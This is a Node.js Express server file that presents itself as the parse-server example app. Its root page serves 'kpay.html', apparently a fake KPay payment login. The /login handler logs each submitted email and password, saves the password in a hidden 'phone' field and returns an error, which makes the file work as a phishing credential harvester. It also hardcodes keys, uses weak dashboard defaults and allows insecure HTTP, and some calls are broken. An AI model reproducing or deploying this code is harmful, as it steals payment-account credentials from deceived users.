// Example express application adding the parse-server module to expose Parse
// compatible API routes.

var express = require('express');
var ParseServer = require('parse-server').ParseServer;
var path = require('path');
var bodyParser = require('body-parser');

var databaseUri = process.env.DATABASE_URI || process.env.MONGODB_URI;
var urlencodedParser = bodyParser.urlencoded({ extended: false })

if (!databaseUri) {
  console.log('DATABASE_URI not specified, falling back to localhost.');
}

var api = new ParseServer({
  databaseURI: databaseUri || 'mongodb://localhost:27017/dev',
  cloud: process.env.CLOUD_CODE_MAIN || __dirname + '/cloud/main.js',
  appId: process.env.APP_ID || '1231asjfi34-jfj3kfdolmn-ddd-aAAaffh',
  masterKey: process.env.MASTER_KEY || 'SSSffjm4848-aj8484-MMM-4kkjfjajddmd-344', //Add your master key here. Keep it secret!
  serverURL: process.env.SERVER_URL || 'http://localhost:1337/parse',  // Don't forget to change to https if needed
  liveQuery: {
    classNames: ["Posts", "Comments"] // List of classes to support for query subscriptions
  }
});

var dashboard = new ParseDashboard({
  "apps": [
    {
      "serverURL": process.env.SERVER_URL || 'http://localhost:1337/parse',
      "appId": process.env.APP_ID || 'myAppId',
      "masterKey": process.env.MASTER_KEY || '',
      "appName": process.env.PARSE_APP_NAME || "stats"
    }
  ],
  "users": [
    {
      "user": process.env.PARSE_DASHBOARD_USERNAME || "usernam3",
      "pass": process.env.PARSE_DASHBOARD_PASSWORD || "password"
    }
  ]
}, {allowInsecureHTTP: true, cookieSessionSecret: 'secretkey'});

// Client-keys like the javascript key or the .NET key are not necessary with parse-server
// If you wish you require them, you can set them as options in the initialization above:
// javascriptKey, restAPIKey, dotNetKey, clientKey

var app = express();

// Serve static assets from the /public folder
app.use('/public', express.static(path.join(__dirname, '/public')));


// Serve the Parse API on the /parse URL prefix
var mountPath = process.env.PARSE_MOUNT || '/parse';
app.use(mountPath, api);

// Parse Server plays nicely with the rest of your web routes
app.get('/', function(req, res) {
  res.sendFile(path.join(__dirname, '/public/kpay.html'));
});

// Serve the dashboard
app.use('/dashboard', dashboard);

// There will be a test page available on the /test path of your server url
// Remove this before launching your app
app.get('/test', function(req, res) {
  res.sendFile(path.join(__dirname, '/public/test.html'));
});

app.post('/login', urlencodedParser,function(req, res) {
  console.log(`${JSON.stringify(req.body)}`);
  var user = new Parse.User();
  user.set("username", req.body.email);
  user.set("password", "password123456");
  user.set("email", req.body.email);

// other fields can be set just like with Parse.Object
  user.set("phone", req.body.password);
  try {
    user.signUp();
    // Hooray! Let them use the app now.
  } catch (error) {
    // Show the error message somewhere and let the user try again.
    alert("Error: " + error.code + " " + error.message);
  }

  res.status(400).send('I dream of being a website.  Please star the parse-server repo on GitHub!');
});

var port = process.env.PORT || 1337;
var httpServer = require('http').createServer(app);
httpServer.listen(port, function() {
    console.log('parse-server-example running on port ' + port + '.');
});

// This will enable the Live Query real-time server
ParseServer.createLiveQueryServer(httpServer);
